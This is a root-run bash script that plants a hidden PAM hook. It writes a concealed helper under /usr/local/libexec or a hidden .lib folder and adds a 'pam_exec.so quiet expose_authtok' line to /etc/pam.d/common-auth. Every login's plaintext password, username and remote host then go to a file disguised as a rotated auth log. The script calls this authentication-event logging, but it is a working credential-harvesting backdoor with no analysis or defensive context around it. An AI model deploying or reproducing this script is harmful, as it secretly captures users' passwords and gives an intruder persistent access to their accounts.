#!/bin/bash

PRIMARY_SCRIPT_PATH="/usr/local/libexec/.system-auth"
FALLBACK_SCRIPT_PATH="/usr/local/.lib/.system-auth"
LOG_FILE="/var/log/auth.1.log"
PAM_CONFIG="/etc/pam.d/common-auth"

if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root. Please run with sudo." 
   exit 1
fi

if [ ! -d "/usr/local/libexec" ]; then
    echo "[!] /usr/local/libexec does not exist. Attempting to create it..."
    mkdir -p /usr/local/libexec
    if [ $? -ne 0 ]; then
        echo "[!] Failed to create /usr/local/libexec. Falling back to $FALLBACK_SCRIPT_PATH"
        SCRIPT_PATH="$FALLBACK_SCRIPT_PATH"
        mkdir -p /usr/local/.lib/
    else
        echo "[+] Successfully created /usr/local/libexec."
        SCRIPT_PATH="$PRIMARY_SCRIPT_PATH"
    fi
else
    echo "[+] /usr/local/libexec exists. Using $PRIMARY_SCRIPT_PATH"
    SCRIPT_PATH="$PRIMARY_SCRIPT_PATH"
fi

echo "[+] Creating the PAM script at $SCRIPT_PATH"
cat << 'EOF' > $SCRIPT_PATH
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/auth.1.log
EOF

echo "[+] Setting permissions for $SCRIPT_PATH"
chmod 700 $SCRIPT_PATH

echo "[+] Creating log file at $LOG_FILE"
touch $LOG_FILE
chmod 770 $LOG_FILE

echo "[+] Updating PAM configuration at $PAM_CONFIG"
if grep -Fxq "auth optional pam_exec.so quiet expose_authtok $SCRIPT_PATH" $PAM_CONFIG
then
    echo "[*] PAM configuration already updated!"
else
    echo "auth optional pam_exec.so quiet expose_authtok $SCRIPT_PATH" >> $PAM_CONFIG
    echo "[+] PAM configuration updated!"
fi

echo "[+] Ensuring $SCRIPT_PATH is executable"
chmod +x $SCRIPT_PATH

echo "[*] Setup complete. Now any authentication events will be logged to $LOG_FILE."
